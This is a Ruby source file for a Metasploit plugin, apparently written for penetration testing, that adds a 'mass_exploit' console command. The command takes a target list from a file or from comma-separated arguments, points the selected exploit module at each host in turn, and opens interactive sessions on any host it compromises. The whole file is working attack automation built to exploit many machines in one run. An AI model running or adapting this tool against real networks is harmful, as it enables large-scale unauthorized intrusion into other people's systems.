#Copyright: KPMG LLP 2011. All rights reserved
#Author: Konrads Smelkovs <ksmelkovs@kpmg.com>
module Msf

  class Plugin::MassExploit < Msf::Plugin


    class MassDispatcher

      include Msf::Ui::Console::ModuleCommandDispatcher

      @@exploit_opts = Rex::Parser::Arguments.new(
        "-f" => [   nil, "Targets file" ],
        "-h" => [ false, "Help"],
        "-t" => [nil,  "List of targets, separated by comma"]
      )




      def commands
        super.update({
            "mass_exploit"   => "Mass exploit currently configured module"
          })
      end

      #
      # Returns the name of the command dispatcher.
      #
      def name
        "Mass"
      end

      def cmd_mass_exploit(*args)

        targets = nil
        targets_file = nil
        while (arg = args.shift)
          case arg

          when '-h'
            cmd_exploit_mass_help
            return

          when '-f'
            targets_file = args.shift
          when '-t'
            targets = args.join.split(/[,\s]+/)
            break
          else
            print_error("Unknown flag #{arg}.")
            return
          end
        end

        if (mod==nil)
          print_error("No exploit module is currently selected")
          return
        end
        if (targets_file)

          targets = File.open(targets_file,"r").readlines.map {|i| i.chomp}
          print_status("Targets file #{targets_file}, read #{targets.count} targets")
        end

        if(targets)
          targets.each {|target|
            mod.datastore['RHOST']=target
            cmd_exploit
          }
        else
          print_error("No targets given")
        end
      end

      def cmd_exploit_mass_help
        print_line "Usage: mass_exploit [options]"
        print_line
        print_line "Launches current exploit at all targets given in options"
        print @@exploit_opts.usage
      end
      #
      # Launches an expoitation attempt.
      #
      def cmd_exploit(*args)
        defanged?

        opt_str = nil
        payload = mod.datastore['PAYLOAD']
        encoder = mod.datastore['ENCODER']
        target  = mod.datastore['TARGET']
        nop     = mod.datastore['NOP']
        bg      = false
        jobify  = true
        force   = false


        begin
          if mod.respond_to? "run":
              mod.run
            session=nil
          else

            session = mod.exploit_simple(
              'Encoder'        => encoder,
              'Payload'        => payload,
              'Target'         => target,
              'Nop'            => nop,
              'OptionStr'      => opt_str,
              'LocalInput'     => driver.input,
              'LocalOutput'    => driver.output,
              'RunAsJob'       => jobify)
          end
        rescue ::Interrupt
          raise $!
        rescue ::Exception => e
          print_error("Exploit exception (#{mod.refname}): #{e.class} #{e}")
          if(e.class.to_s != 'Msf::OptionValidateError')
            print_error("Call stack:")
            e.backtrace.each do |line|
              break if line =~ /lib.msf.base.simple/
              print_error("  #{line}")
            end
          end
        end

        # If we were given a session, let's see what we can do with it
        if (session)

          # If we aren't told to run in the background and the session can be
          # interacted with, start interacting with it by issuing the session
          # interaction command.
          if (bg == false and session.interactive?)
            print_line

            driver.run_single("sessions -q -i #{session.sid}")
            # Otherwise, log that we created a session
          else
            print_status("Session #{session.sid} created in the background.")
          end
          # If we ran the exploit as a job, indicate such so the user doesn't
          # wonder what's up.
        elsif (jobify)
          if mod.job_id
            print_status("Exploit running as background job.")
          end
          # Worst case, the exploit ran but we got no session, bummer.
        else
          # If we didn't run a payload handler for this exploit it doesn't
          # make sense to complain to the user that we didn't get a session
          unless (mod.datastore["DisablePayloadHandler"])
            print_status("Exploit completed, but no session was created.")
          end
        end
      end
    end # end class

    def initialize(framework, opts)
      super
      # console dispatcher commands.
      #print_status("Mass is now loading")
      add_console_dispatcher(MassDispatcher)
    end

    def cleanup

      # print_status("mass is cleaning up")
      remove_console_dispatcher('Mass')
    end

    def name
      "mass"
    end

    def desc
      "Mass Exploit Plugin"
    end
  end # end MassExploit
end # end module
